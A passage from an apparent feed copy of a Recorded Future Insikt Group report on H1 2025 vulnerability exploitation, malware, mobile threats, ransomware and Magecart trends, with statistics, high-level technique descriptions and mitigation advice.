extracted and executed this hidden code by targeting a specific &lt;link&gt; element in the Document Object Model (DOM), initiating a WebSocket connection for real-time data exfiltration. These technical refinements underscore the adaptability of Magecart operations and the ongoing need for vigilant web security measures.</p>\n        <h2>Mitigations</h2>\n        <p>Organizations can use the following measures to mitigate the threats discussed in this report.</p>\n        <h3>Vulnerability Exploitation</h3>\n        <ul>\n          <li><strong>Recorded Future Vulnerability Intelligence:</strong> Recorded Future customers can use <a href=\"https://www.recordedfuture.com/products/vulnerability-intelligence\">Vulnerability Intelligence</a> to gain timely and comprehensive insights into publicly and privately known vulnerabilities tailored to specific security needs that can help prioritize remediation measures.

These provisions require a documented inventory of all payment‑page scripts, explicit authorization and business justification for each script, integrity monitoring, and real-time change detection with alerts for unauthorized modifications.</li>\n        </ul>\n        <h2>Outlook</h2>\n        <p>In the remainder of 2025, Insikt Group assesses that exploitation of edge-security appliances, remote access tools, and other gateway-layer software will almost certainly remain a top priority for both state-sponsored and financially motivated threat actors. The strategic value of these systems — acting as intermediaries for encrypted traffic and privileged access — makes them high-reward targets. As seen in H1 2025, vulnerabilities in products from Microsoft, Fortinet, Ivanti, and others continue to be exploited even after public disclosure, particularly when PoC code becomes available. Insikt Group expects this trend to accelerate, especially given the growing lag between vulnerability disclosure and patch implementation across enterprises.</p>\n        <p>Given its steep adoption curve, Insikt Group assesses that ClickFix will almost certainly remain a favored initial access technique through the rest of 2025. Unless widespread mitigations or awareness campaigns reduce its effectiveness, the technique’s ease of deployment and efficacy will likely sustain its prevalence in the near term.</p>\n        <p>Malware development is also expected to continue along two concurrent paths: the repurposing of legacy code and the refinement of stealth techniques. The resurgence of Sality and Tofsee, alongside more advanced loaders and evasive delivery mechanisms like JIT hooking, suggests that actors will continue blending old tools with modern obfuscation to defeat signature-based defenses. Insikt Group anticipates that commodity RATs will remain prominent due to their accessibility and versatility for persistent access and data theft.</p>\n        <p>Mobile malware will likely play an increasingly important role in cybercriminal operations, particularly with the growth of contactless payment fraud and virtualization-based evasion techniques. Threat actors will almost certainly continue targeting mobile banking and NFC technologies, leveraging both fake app distribution and supply-chain compromises to infect devices at scale.</p>\n        <p>In the ransomware ecosystem, Insikt Group expects to see continued experimentation with business models and affiliate structures. “Cartel”-style approaches, such as those introduced by DragonForce, alongside flexible affiliate tiers and services like legal intimidation support, are likely to gain traction as groups seek differentiation and resilience in a post-LockBit landscape. Parallel innovation in defense evasion and deployment, including BYOI exploits and password-protected payloads, will likely persist as defenders improve endpoint and network monitoring.</p>\n        <p>Magecart activity is expected to remain steady or increase in sophistication through the end of 2025. With e-commerce remaining a lucrative target, threat actors will likely adopt even more modular and covert skimming methods, abusing legitimate services like Google Tag Manager or exploiting under-patched plugins across platforms like WooCommerce. Continued abuse of obscure HTML tags, CSS properties, and obfuscated JavaScript delivery mechanisms is likely as attackers aim to bypass increasingly strict content security policies.</p>\n        <p>Overall, the H1 2025 trends suggest that defenders must prepare for a hybrid threat environment in which aging malware resurfaces alongside cutting-edge delivery chains and mobile platforms and edge systems become focal points of exploitation. Cross-platform visibility, tighter app and gateway security, and proactive intelligence integration will be critical to managing these evolving risks through the second half of the year.</p>\n      </div>\n      <div></div>\n      <div></div>\n      <div></div>\n    ","content:encodedSnippet":"H1 2025 Malware and Vulnerability Trends\n\n      \nExecutive Summary\nThe first half of 2025 (H1 2025) reflected a rapidly evolving threat landscape defined by the convergence of persistent legacy threats and advanced new tactics.\nThe total disclosed CVEs increased by 16% from H1 2024, and threat actors exploited 161 vulnerabilities with assigned CVEs, with nearly half linked to malware or ransomware campaigns. Microsoft remained the most targeted vendor, while edge security and gateway devices continued to be high-value targets for initial access. Malware activity was similarly dynamic: while law enforcement takedowns disrupted major players like LummaC2, a resurgence of legacy malware such as Sality indicated that old tools still offer utility for modern actors. Remote access trojans (RATs) like AsyncRAT, XWorm, and Remcos also gained prominence, marking a tactical shift away from the previous dominance of dedicated information stealers (infostealers) in H1 2024 toward more versatile tools that combine data theft capabilities with persistent, hands-on access.\nMobile malware threats continued to grow in H1 2025, with Android banking trojans adopting virtualization-based overlays and near-field communication (NFC) relay attacks to bypass user defenses and enable real-world financial fraud. These innovations reflect a growing trend in financial fraud toward mobile-first exploitation targeting both app and payment ecosystems. Ransomware groups, meanwhile, leaned further into affiliate-driven models, offering ready-made payloads and infrastructure to lower barriers for new entrants. Some ransomware families introduced stealth features such as protected payloads or novel loaders designed to evade endpoint detection. Meanwhile, Magecart skimming campaigns adopted multi-stage, modular infection chains and innovative obfuscation techniques to evade content security policies and inject malicious scripts only during critical moments like checkout.\nTaken together, H1 2025 underscores that the threat landscape is not only expanding but fragmenting, with threat actors exploiting both novel and legacy tools across diverse attack surfaces. To respond effectively, organizations should prioritize patching of internet-facing systems, particularly gateway and edge security products, which are frequently targeted for initial access. Detection capabilities must extend beyond endpoint telemetry to include behavioral monitoring, command-and-control (C2) traffic analysis, and script obfuscation detection in web environments. Investment in threat intelligence is essential for staying ahead of rapidly changing tactics, such as malware repackaging. Organizations should also revisit mobile device policies and strengthen application vetting and user awareness to counter increasingly sophisticated mobile malware campaigns.\nKey Findings\nCVE disclosures increased 16% compared to H1 2024, with 161 of those vulnerabilities actively exploited in H1 2025. Of those, 42% had a public proof-of-concept (PoC) exploit, nearly 69% required no authentication, and 30% enabled remote code execution (RCE), underscoring attackers’ preference for low-friction, high-impact exploits. Microsoft and edge-gateway appliances each made up 17% of exploits, and more than half of the attributed exploitations were state-sponsored, highlighting state-sponsored threat actors’ high capabilities to weaponize flaws quickly.\nBased on Recorded Future Triage submissions and Insikt Group reporting, Command and Control (TA0011) was the most frequently observed malware tactic, with over 194,000 detections. Top techniques (according to the MITRE ATT&CK matrix) included data encrypted for impact (T1486), valid accounts (T1078), and data from local systems (T1005), emphasizing the prevalence of ransomware deployment and the importance of persistent access to obtain and exploit sensitive data.\nThe mobile threat landscape continued to evolve during the first half of 2025, marked by the discovery of eleven new mobile malware strains and the resurgence or continued operation of nine others. This included banking trojans, infostealers, spyware, and RATs. Long-standing tactics, techniques, and procedures (TTPs) like overlay attacks remained common, though with some innovation.\nThreats to contactless payments increased, as evidenced by the discovery of SuperCard X, a Chinese MaaS platform that enables NFC relay fraud by capturing and transmitting contactless card data to attacker-controlled devices.\nRansomware threat actors adopted new TTPs across the attack chain during the first half of 2025. This included ClickFix-based social engineering for initial access, endpoint detection and response (EDR) evasion via bring-your-own-installer (BYOI) techniques, and custom payloads using just-in-time (JIT) hooking and memory injection to bypass detection. Ransomware threat actors also continued to use legitimate tools for persistence, data theft, and stealthy C2, including AnyDesk to maintain access, Syteca for keylogging, and GC2 for cloud-based C2.\nVulnerability Exploitation Trends\nKey Takeaways\n23,667 CVEs were published in H1 2025, a 16% increase compared to H1 2024. Attackers actively exploited 161 vulnerabilities, and 42% of those exploited flaws had public PoC exploits. 21 out of the 27 Nuclei templates published by Insikt Group corresponded to vulnerabilities that appear in the US Cybersecurity and Infrastructure Security Agency (CISA) Known Exploited Vulnerabilities (KEV) catalog.\nMicrosoft products accounted for 17% of such exploitations, but attackers also concentrated on edge‑security and gateway appliances such as SSL‑VPNs and next-gen firewalls (similarly 17%), whose position at the network perimeter makes them attractive entry points for attacks that can later propagate through downstream supply chains.\n69% of exploited vulnerabilities did not require authentication, and nearly one-third enabled RCE. 151 exploited vulnerabilities were used to deploy malware and 73 to launch ransomware, with backdoors the most common payload.  State-sponsored actors drove more than half of the attributed exploitation, highlighting the significant strategic drivers of such attacks, as well as such actors’ capabilities to weaponize flaws shortly after disclosure.\nMicrosoft Leads Actively Exploited Vulnerabilities as Total Disclosed Vulnerabilities Rise Compared to 2024\nIn the first half of 2025, the volume of disclosed vulnerabilities continued to climb. The total number of CVEs increased by 16% compared to H1 2024, rising from 20,385 in H1 2024 to 23,667 in H1 2025. This growth suggests an expanding attack surface and more opportunities for threat actors to find exploitable flaws. Notably, the most common vulnerability types by weakness were web application issues: Cross-Site Scripting (CWE-79) and SQL Injection (CWE-89) represented the highest share of weaknesses, followed by Cross-Site Request Forgery (CWE-352), generic Injection flaws (CWE-74), and Missing Authorization (CWE-862). This highlights that fundamental security gaps in web applications remain widespread, and organizations should heed these trends; the persistence of injection and scripting weaknesses means attackers will continue to find easy targets in poorly secured web interfaces.\nWhen looking at actively exploited vulnerabilities in H1 2025, Microsoft products dominated the field. Microsoft accounted for the highest number of actively exploited CVEs with 28 (see Figure 1), of which twenty targeted Windows specifically. This tally was more than triple that of the next most targeted vendors: Apple (eight), Ivanti (seven), and Linux (six). The outsized targeting of Microsoft likely reflects the ubiquity of Windows across enterprises; attackers naturally prioritize vulnerabilities in widely deployed systems to maximize potential victims. In total, Insikt Group identified exploited vulnerabilities affecting 81 distinct vendors. This breadth indicates that exploitation in the wild is not concentrated on just a few big-name software suites; instead, attackers are casting a wide net.\nAttackers continue to opportunistically probe less common software and environments, likely perceiving that organizations may delay patches or have limited monitoring on those systems, making them softer targets. For defenders, this means a robust patch management program cannot ignore the long tail of software assets: a vulnerability in a lesser-known product can still be the entry point for a major breach if left unpatched.\nFigure 1: Top ten vendors (including ties) by number of actively exploited CVEs in H1 2025 (Source: Recorded Future)\nAnother notable trend is the focus on vulnerabilities in the tools designed to keep networks safe. 17% of the actively exploited CVEs affected edge-security and gateway products. This included SSL-VPNs, next-gen firewalls, secure gateways, and remote access portals from vendors such as Ivanti, SonicWall, Fortinet, Palo Alto, Cisco, Citrix, Juniper, and Sophos, as well as virtualization underlays like VMware.\nBecause these appliances terminate VPNs, decrypt traffic, and broker trust between networks, a single exploit instantly grants attackers a privileged, authenticated pathway into an organization’s environment for initial access and lateral movement. For instance, CVE-2025-0282 (Ivanti Connect Secure and Policy Secure) allowed remote, unauthenticated attackers to execute arbitrary code on the appliance and steal credentials for further lateral movement inside the network. This trend underscores that threat actors — including well-resourced state-sponsored groups — are increasingly targeting these security infrastructure platforms to operate with minimal detection. Organizations must harden and promptly patch their network edge devices and monitor them closely, as these systems have become high-value targets that attackers use to bypass traditional defenses and pivot deep into corporate networks.\nAttackers were observed exploiting 161 distinct vulnerabilities in the first half of 2025, according to Recorded Future data. This exceeds the 136 vulnerabilities listed in CISA’s KEV catalog for the same timeframe. In other words, Recorded Future telemetry identified 25 additional exploited CVEs beyond what was publicly recognized by CISA during that period.\nOf those 161 exploited flaws, 68 (42%) had a publicly available PoC exploit (see Figure 2). The availability of a PoC lowers the bar for exploitation, effectively allowing a larger pool of attackers (including less-skilled threat actors) to weaponize the vulnerability. In multiple cases, Insikt Group has observed exploitation activity surge within days or hours of a PoC release. Organizations should therefore implement rapid patching or interim mitigations to limit the window of exposure.\nFigure 2: Actively exploited vulnerabilities with a public PoC exploit, by month (Source: Recorded Future)\nIn terms of access requirements and impact, Figure 3 shows that 111 (69%) of the 161 vulnerabilities required no authentication to exploit, and 78 (48%) could be exploited remotely over a network (as opposed to requiring local access or user interaction). In other words, this heavy tilt toward unauthenticated, remote exploits means that attacks can be launched directly from the internet against vulnerable hosts, with no credentials or insider access needed.\n48 (30%) of the exploited CVEs enabled RCE, which often grants an attacker full control over the target system, while another 11 (7%) enabled privilege escalation, which is typically used to gain higher system access. None of the exploited vulnerabilities facilitated lateral movement (exploits that facilitate jumping from one system to another). Given that so many exploited flaws are both remotely exploitable and require no valid user account, organizations must proactively scan and prioritize patching for internet-facing applications and services.\nFigure 3: Actively exploited vulnerabilities by impact factors (Source: Recorded Future)\nUNC5221 Focuses on Ivanti Products as Cobalt Strike Is Most Frequently Associated with Post-Exploitation Activity\nThe threat actors exploiting these vulnerabilities range from sophisticated state-sponsored groups to profit-driven cybercriminals, and the data from H1 2025 highlights the significant role of state-sponsored campaigns. In cases where Insikt Group could determine attribution, nearly 53% of the observed exploitation activity was driven by state-sponsored and suspected state-sponsored actors. This illustrates that more than half of the attributed exploitations were strategic in nature and conducted for espionage, surveillance, or other geopolitical objectives.\nFinancially motivated groups (those involved in, for example, theft and fraud and not necessarily linked to ransomware) accounted for 27% of exploitations. Another 20% of exploitation was attributed to ransomware and extortion groups, reinforcing how common it has become for ransomware operators to leverage exploits as an initial access vector to then conduct file-encrypting attacks at scale.\nThis breakdown highlights that both strategic and criminal motivations are driving vulnerability exploitation, with a notable absence of any known hacktivist campaigns; hacktivist collectives are typically motivated by disruption and likely lack the intent and capability to conduct such exploitations.\nBy contrast, the presence of state-sponsored actors at the top underlines that many governments’ cyber units have the resources to weaponize new flaws quickly, often within days of a disclosure. The significant state-sponsored involvement also implies that these threats are not just random or opportunistic but often targeted and persistent campaigns aiming at specific sectors or high-value systems.\nGeographically, the majority of state-sponsored campaigns were conducted by Chinese state-sponsored actors or suspected China-linked actors. Such groups are known to exploit edge infrastructure and enterprise solutions to establish footholds in target networks, and Insikt Group’s observations in the first half of 2025 reaffirm that. The suspected China-linked group UNC5221 exploited the highest number of vulnerabilities and demonstrated a preference for Ivanti products, targeting Ivanti Endpoint Manager Mobile (EPMM; CVE-2025-4428) and Ivanti Connect Secure and Policy Secure (CVE-2025-22457 and CVE-2025-0282).\nFigure 4: Vulnerabilities by triggered risk rule, based on Recorded Future data (Source: Recorded Future)\nOf the 161 exploited vulnerabilities, Recorded Future data shows that 151 were leveraged in some form of malware deployment (see Figure 4). Within those, 73 vulnerabilities were specifically tied to ransomware deployments — they were either the initial access point for a ransomware attack or used at some stage in the ransomware kill chain. In practical terms, unpatched vulnerabilities are a common entry point for attackers to introduce malware into a victim’s environment; whether the ultimate payload is a remote access trojan (RAT) or ransomware, the initial step of exploiting a weakness is the same.\nInsikt Group found that the most commonly observed malware used post-compromise was the offensive security tool Cobalt Strike. Tools such as Cobalt Strike are ideal for gaining a reliable foothold for attackers as they provide a full-featured toolkit to run commands, escalate privileges, and move laterally, while blending in with normal network traffic. After Cobalt Strike, the Vshell RAT was the malware most frequently observed alongside exploitation.\nOverall, as shown in Figure 5, backdoor malware accounted for nearly 23% of all post-exploitation activity. The frequent appearance of backdoors and various trojans means that a single exploit often leads to multi-payload efficiency for attackers: with one vulnerability, they may deploy a backdoor, which then allows them to stage additional tools or eventually deliver ransomware, all from that same initial entry point and without needing to develop custom malware.\nFor defenders, this trend is a reminder to monitor for known post-exploitation tools and behaviors. The presence of Cobalt Strike beacons, for example, should be treated as an immediate high-priority incident, while an unusual use of legitimate admin tools or new services could indicate that a RAT or backdoor is running.\nFigure 5: Actively exploited vulnerabilities by malware category (Source: Recorded Future)\nFrom a tactics and techniques perspective, the patterns of exploitation in the first half of 2025 align with known adversary behaviors in the MITRE ATT&CK framework. The most frequent ATT&CK technique was Exploit Public‑Facing Application (T1190), observed in 73% of actively exploited vulnerabilities. This was followed by Exploitation for Client Execution (T1203) and Exploitation for Privilege Escalation (T1068). These three techniques demonstrate a clear picture of attacker preferences and playbooks. T1190 indicates that attackers are heavily targeting servers and services exposed to the internet (for example, web servers or VPN gateways), which is a direct route into a network.\nThe prevalence of T1203 shows that attackers are also investing in exploits that require user interaction (for example, a malicious email attachment or drive-by download that triggers an exploit on the victim’s end). In these scenarios, the vulnerability may be in a client-side application such as a browser or office document software, and the attacker socially engineers the victim into running the exploit. T1068 underscores that once attackers get a foothold, they often elevate their privileges (for example, going from a normal user to SYSTEM or root). This pattern shows how attackers frequently leverage initial access, execution, and privilege escalation into a single exploit chain, and illustrates how an attacker can go from having no access to domain admin privileges if the right combination of unpatched flaws exists.\nInternet-facing systems and unpatched client software will remain prime targets, and failing to patch those creates an avenue for attackers to get in and escalate their privileges. Defenders should ensure both their perimeter systems and endpoint applications are up to date, and have monitoring in place for exploit attempts.\nFigure 6: Share of actively exploited vulnerabilities by the most common MITRE ATT&CK techniques (Source: Recorded Future)\nInsikt Group Detection Rules Maintain Alignment with Known Exploited Vulnerabilities\nIn the first half of 2025, Insikt Group’s own detection efforts kept pace with the evolving threat landscape by continuously creating new Nuclei templates (automated vulnerability detection signatures). Insikt Group created 27 new Nuclei templates designed to identify vulnerable systems, focusing on the most dangerous flaws. 21 out of the 27 templates corresponded to vulnerabilities that appear in CISA’s KEV catalog. In other words, the majority of Insikt Group’s detection rules were directly aligned to vulnerabilities that were known to be actively exploited in the wild.\nThe vendors that showed up most frequently in Insikt Group’s Nuclei templates were Fortinet, Apache, and Ivanti, which is consistent with the threat trends observed. By developing Nuclei templates for these vendors’ vulnerabilities, Insikt Group helped equip organizations to rapidly scan their infrastructure and find any unpatched instances before attackers do.\nNotably, Insikt Group published 13 unique Nuclei templates that do not have an existing public template available from Project Discovery (see Figure 7). In those cases, Insikt Group authored and shared the detection logic for vulnerabilities that were not yet covered by the open-source community for Nuclei signatures, filling critical detection gaps for Recorded Future customers.\nFigure 7: Overlap of Insikt Group Nuclei templates with CISA KEV and Project Discovery\n(Source: Recorded Future, CISA, Project Discovery)\nAdditionally, Figure 8 shows the time between Insikt Group’s publication of a Nuclei template and the targeted vulnerability’s addition to CISA’s KEV catalog (the below chart only lists CVEs that both had a template and were added to KEV). Five vulnerabilities that were added to KEV in H1 2025 — CVE-2025-32433 (Erlang SSH), CVE-2025-24813 (Apache Tomcat), CVE-2024-41713 and CVE-2024-55550 (Mitel MiCollab), and CVE-2024-56145 (Craft CMS) — had an existing Insikt Group Nuclei template available. This means organizations leveraging Insikt Group’s detections could scan for those issues as soon as (or even before) they were formally recognized as actively exploited by CISA.\nFor vulnerabilities added to KEV in 2025 for which Insikt Group did not already have a Nuclei template, the average turnaround time to publish a new template was 8 days after the KEV listing.\nFigure 8: Timeline comparison of Insikt Group's Nuclei template releases and CISA KEV's CVE inclusions in H1 2025 (Source: Recorded Future)\nFurthermore, during vulnerability testing and validation, Insikt Group discovered that Apache Tomcat 8.5.x versions (specifically 8.5.0 to 8.5.98 and 8.5.100, with the exception of 8.5.99) were also vulnerable to CVE-2025-24813, even though they were not included in Apache’s initial list of affected product versions. In practice, this meant that many organizations running slightly older Tomcat 8.5 releases could have been unknowingly at risk if they only followed the vendor’s advisory. By identifying those versions and providing a Nuclei template, Insikt Group provided a detection rule and an early warning and remediation guidance beyond what the vendor had first communicated.\nMalware Trends\nKey Takeaways\nLegacy malware families such as Sality and Tofsee reemerged as top threats, with Sality ranking first in configuration-based C2 detections — a notable shift from recent infostealer-dominated trends and a sign that threat actors are repackaging older codebases for modern use.\nCommodity remote access trojans (RATs) like AsyncRAT, XWorm, and Remcos were prominent in Recorded Future Triage data, including malware C2 extractions, reflecting a continued preference among threat actors for tools that support persistent access and data theft across varied intrusion campaigns.\nMITRE ATT&CK Tactic TA0011 (Command and Control) was the most frequently observed TTP across Recorded Future Triage submissions and Insikt Group reporting, with over 194,000 events recorded in H1 2025. Other commonly used techniques included data encryption, local data theft, and credential abuse, highlighting the emphasis on monetization and lateral movement.\nRansomware threat actors adopted new TTPs across the attack chain, including ClickFix-based social engineering for initial access, EDR evasion via BYOI techniques, and custom payloads using JIT hooking and memory injection to bypass detection. Ransomware threat actors also used legitimate tools for persistence, data theft, and stealthy C2.\nMagecart infections remained elevated, with threat actors continuing to abuse Google Tag Manager (GTM), obscure HTML tags, and even CSS ::before content properties to deploy modular e-skimmers on e-commerce platforms while evading content security policies.\nBotnets and the Return of Legacy Malware in C2 Detections\nRecorded Future identifies command-and-control (C2) servers based on malware configurations extracted from samples submitted to Recorded Future Triage. References to malware families in C2 detections in H1 2025 show major changes compared to H1 2024 in terms of prevalent malware families. Infostealers remain a cornerstone of the threat landscape, consistent with most threat actors’ financial motivations, as stolen credentials, payment data, and crypto wallets can be monetized directly or sold on dark web markets. However, the specific malware driving these C2 detections has shifted. Several of H1 2024’s top ten malware (Vidar, RedLine Stealer, and LokiBot, for example) have largely fallen off in 2025, owing in part to disruptive operations and law enforcement actions, while other malware families surged or emerged to take their place.\nFigure 9: The top ten malware families by number of references to C2 detections in H1 2025 and H1 2024 (Source: Recorded Future)\nH1 2025’s C2 detections also highlight the enduring presence of long-lived malware. Sality, a polymorphic botnet first seen in 2003, remains in the top tier after a major resurgence in 2024, demonstrating the resilience of legacy threats. Likewise, the Tofsee trojan (active for over a decade) appears among the top families. Tofsee is a modular backdoor capable of spamming, DDoS attacks, cryptomining, and more, and its continued activity further demonstrates how older malware can persist as a steady backbone of criminal operations. The presence of these botnets, even as their absolute reference counts are far below last year’s peak levels, indicates that threat actors still find value in exploiting well-established malware infrastructure that has stood the test of time. Notably, Sality’s and Tofsee’s ongoing use suggests that some attackers favor legacy tools either for their reliability or simply to target less-protected systems, even amid a constant influx of new malware. This mirrors the trend observed in H1 2024 with Sality’s reappearance, reinforcing that “outdated” malware can remain unexpectedly prevalent.\nMeanwhile, last year’s infostealer frontrunner LummaC2 has seen a precipitous decline, likely a consequence of coordinated takedowns by law enforcement agencies. In late May 2025, an international operation seized LummaC2’s infrastructure — over 2,300 domains — and wiped its main server, severely disrupting this malware-as-a-service. As a result, LummaC2 all but vanished from the top ranks for H1 2025, echoing RedLine Stealer’s massive drop-off following the April 2023 GitHub repository takedown that broke RedLine’s C2 panels. However, Insikt Group recently discovered that LummaC2 operators have begun to reestablish infrastructure using Cloudflare-based C2 domains, signaling at least a partial operational recovery. Multiple new domains tied to LummaC2, observed as recently as mid-July 2025, resolve to Cloudflare IP addresses — a shift back to previous tactics following an initial pivot away from the provider after the takedown. This rapid pivot highlights the underlying resilience and adaptability of LummaC2’s operators, who appear capable of reconstituting infrastructure and tactics even in the wake of extensive disruption.\nAnother development in H1 2025 is the increased prominence of remote access trojans (RATs) in C2 detections. Several commodity RAT families, including Remcos, AsyncRAT, and XWorm, climbed into the top ten this period. These RATs are freely or cheaply available and grant attackers hands-on control over compromised systems, making them versatile for espionage and data theft and as launchpads for ransomware. The ascent of these RATs suggests that many threat actors are leveraging RATs to maintain persistent, interactive access in victim environments, an approach favored by financially motivated groups and advanced actors alike. Their growing share in C2 detections may also imply that, as some infostealing services were disrupted, adversaries pivoted to using RATs, which often include info-stealing capabilities, as an alternative means to achieve similar goals.\nOverall, the C2 detection trends of H1 2025 reflect an evolving threat landscape that is both dynamic and cyclical. While Insikt Group observes constant churn at the top, some long-standing threats and tools never truly disappear but persist or resurge in cycles, contributing steadily to the baseline of malicious activity. Financially motivated actors remain dominant, favoring infostealers and RATs that directly feed their profit motives. H1 2025’s C2 detections were defined by a revival of credential-stealing trojans amid a backdrop of resilient legacy botnets and increased reliance on RATs for interactive control. These trends underscore that defenders must be prepared for both cutting-edge malware and the enduring tactics of established threats moving into the latter half of 2025 and beyond.\nMalware TTP Trends and Insights\nBetween January and June 2025, Recorded Future's Insikt Group analyzed and aggregated thousands of malware-related observations to identify the top tactics, techniques, and procedures (TTPs) employed by threat actors mapped to the MITRE ATT&CK® framework. This data is sourced from Recorded Future Triage public sandbox submissions and Insikt Group reporting. Leading the list by a significant margin is the Command and Control (TA0011) tactic, with over 194,000 observations, highlighting its central role in enabling adversary communication with compromised systems.\nFrequently observed TTPs include Data Encrypted for Impact (T1486), indicative of widespread ransomware activity, and Data from Local System (T1005), pointing to persistent data theft operations. Initial Access (TA0001) techniques such as Valid Accounts (T1078) and External Remote Services (T1133) were also highly represented, indicating adversary focus on stealing credentials and then using them to gain access via external-facing remote services. External Remote Services is also a persistence technique, discussed later in this section.\nFigure 10: The top ten TTPs in H1 2025 based on Recorded Future Triage and Insikt Group reporting (Source: Recorded Future)\nInsikt Group observed ClickFix as a prominent, emerging initial access technique in H1 2025. ClickFix is a social engineering technique that tricks users into running malicious scripts by presenting deceptive error messages or verification instructions, either prompting them to paste and execute commands manually or by using clipboard hijacking to automate the process. First identified in October 2023, the technique gained significant traction in the latter half of 2024, with its use surging by 517% year-over-year during the first half of 2025, according to ESET.\nFigure 11: Illustration of ClickFix social engineering attack chain (Source: Recorded Future)\nFurther, the presence of Compromise Accounts (T1586) and External Remote Services (T1133) suggests adversaries are focusing on persistence and remote access. The technique Remote Services (T1021) supports lateral movement, while the tactics Execution (TA0002) and Defense Evasion (TA0005) round out the top ten, showcasing the breadth of tactics malware operators employ to infiltrate, persist, and evade detection across networks.\nCryptominer\nRAT\nStealware\nOffensive Security Tool\nBotnet\nXMRig\nnjRAT\nDCRat\nXWorm\nAsyncRAT\nRedLine\nLummaC2\nStealc\nCobalt Strike\nMirai\nTable 1: The top ten malware families in H1 2025 based on Recorded Future Triage public sandbox data (Source: Recorded Future)\nBased on Recorded Future Triage public sandbox data, from January to June 2025, XMRig Miner was the most-submitted malware family. XMRig Miner is a multi-stage cryptojacking tool, typically delivered via malicious loaders or exploits, that covertly hijacks CPU resources to mine Monero (XMR), and employs evasion and persistence mechanisms to avoid detection and maximize uptime. Throughout H1 2025, Cobalt Strike, njRAT, DCRat, and XWorm rounded out the top five for public submissions to Recorded Future Triage.\nFigure 12: The top ten ransomware families in H1 2025 based on Recorded Future Triage public sandbox data (Source: Recorded Future)\nBased on Recorded Future Triage public sandbox data, from January to June 2025, LockBit was the most-submitted ransomware family, followed by Chaos, Akira, Xorist, and Agenda (Qilin). LockBit is a notorious ransomware family that has remained operational despite significant law enforcement efforts to dismantle it, notably through \"Operation Cronos\" in early 2024, which aimed to disrupt its infrastructure. Babuk and Chaos had source code leaked in June 2021 and April 2022, respectively. This makes them more widely accessible for reuse, leading to the development of numerous variants, which likely contribute to their prevalence in Recorded Future Triage data.\nMobile Malware\nAn Ever-Expanding Landscape\nThe mobile threat landscape continued to expand during the first half of 2025. Insikt Group identified at least eleven new malware strains, including RATs, infostealers, and spyware, and ongoing use or resurgence of nine others, including the multi-platform spyware Graphite, LightSpy, and Predator.\nBanking Trojan\nRAT\nSpyware\nStealware\nNEW\nCrocodilus\nSuperCard X\nTsarBot\nNEW\nBTMOB\nGorilla\nNEW\nAndroid.Spy.1292.origin\nSpyLend\nNEW\nDcpro\nSalvador Stealer\nSparkKitty\nTria Stealer\nRESURGENT / ONGOING\nRESURGENT / ONGOING\nRESURGENT / ONGOING\nRESURGENT / ONGOING\nGodFather\nMarcher\nTgToxic\nPJobRAT\nTriada\nGraphite\nLightSpy\nPredator\nSparkCat\nTable 2: Overview of newly identified and previously known mobile malware in H1 2025 (Source: Recorded Future)\nSeveral interrelated factors likely explain the continued expansion of the mobile threat landscape. The increased adoption of mobile devices for mobile banking and in corporate environments offers financially motivated threat actors an even larger attack surface. Particularly attractive is the prevalence of vulnerable mobile devices powered by outdated operating systems that lack the latest security patches.\nThe return of Predator was likely sustained by continued commercial demand despite international scrutiny. Similarly, Graphite was detected on devices belonging to European journalists, indicating ongoing misuse in targeted surveillance. Lastly, new detections of LightSpy, a spyware linked to Chinese state-sponsored surveillance in Hong Kong, almost certainly indicate sustained regional espionage efforts against mobile users.\nThreat Actors Favor Fake Downloads, Abuse Official Stores, and Exploit Supply Chains\nThreat actors consistently relied on long-established TTPs to deliver mobile malware, primarily combining social engineering tactics like smishing and vishing, with fake downloads and brand impersonation to lure victims into installing malicious APKs. Campaigns often featured phishing pages and malware payloads mimicking popular browsers, cryptocurrency platforms, financial apps, streaming services, and official app stores. In more targeted cases, attackers tailored lures to specific victims, as exemplified by Android.Spy.1292.origin, which targeted Russian military personnel by impersonating Alpine Quest Pro, a GPS and topographic mapping app reportedly used by both civilians and Russian military personnel.\nThreat actors also employed less common but effective distribution methods, including abusing Google Play to deliver malware. While increasingly robust security measures have made delivering malware through official app stores more difficult, adversaries continued to find workarounds. SpyLend, for example, posed as “Finance Simplified” and evaded detection by offloading the malicious payload via external download links. Additionally, in a rare supply-chain compromise, a new variant of the Triada RAT was discovered pre-installed on counterfeit Android devices sold via unauthorized retailers.\nAccessibility Service Abuse With a Twist\nOnce installed, Android-targeting malware frequently abused the brand’s Accessibility services, a long-standing TTP that grants broad control over infected devices. Android malware abused the functionality to steal sensitive information through overlay attacks, intercept text messages and push notifications, perform keylogging, screen and audio recording, and OCR-based image scanning, and ultimately take over the device to facilitate so-called “on-device fraud.”\nThe Android trojan GodFather stood out during the reporting timeframe for introducing a new overlay technique. While still abusing Android’s Accessibility services, a new iteration of GodFather identified in June 2025 was observed employing a virtualization-based overlay technique that combined open-source hooking frameworks such as Xposed with sandboxed app environments. This approach differs from traditional overlay attacks by using VirtualApp to create a virtualized environment that runs cloned banking apps without installing or modifying them on the device, effectively bypassing standard overlay detection mechanisms.\nThreats to Contactless Payments Continue to Rise\nFigure 13: Illustration of NFC-relay attack flow (Source: Recorded Future)\nIn the first half of 2025, mobile malware posed a growing threat to contactless payment systems, exemplified by the emergence of SuperCard X, a Chinese-language MaaS platform targeting Android devices. The malware enables threat actors to conduct NFC relay fraud by tricking victims into tapping their contactless cards against compromised phones. Once a card is tapped, SuperCard X captures the NFC signal and relays it to a remote device controlled by the attacker, facilitating fraudulent transactions or ATM withdrawals. Its functionality closely mirrors that of NFCGate, an open-source tool developed in 2020, and shares similarities with NGate, an Android malware linked to NFC-based attacks in the Czech Republic during 2024, indicating likely code reuse or conceptual overlap.\nNotably, the use of NFCGate-style techniques in real-world attacks has grown steadily. In January 2025, Russian cybersecurity firm F6 reported more than 100 such NFC relay attacks during 2024, with estimated losses of approximately $400,000. In a follow-up report from April 2025, F6 documented an additional 40 successful NFCGate-based attacks, with an average loss of approximately $1,500.\nRansomware\nRansomware Groups Innovate to Attract Affiliates Amid a Reshaped Landscape\nIn the first half of 2025, the ransomware landscape continued to evolve, witnessing the return of CL0P after a relatively quiet 2024, with its Cleo managed file transfer (MFT) data theft campaign. This campaign potentially affected over 300 organizations globally, according to Recorded Future ransomware victim data. Alongside the continued activity of groups like Akira and Play, several lesser-known and emerging ransomware groups gained traction, likely reflecting the lingering vacuum and uncertainty that resulted from LockBit’s infrastructure takedown and ALPHV’s exit scam in early 2024.\nTwo additional events further reshaped the ransomware landscape in early 2025. These were the demise of BlackBasta in early February, which followed a leak of internal chat logs, and the abrupt disbandment of RansomHub in late March, which left victims mid-negotiation and affiliates in disarray. Insikt Group assesses that 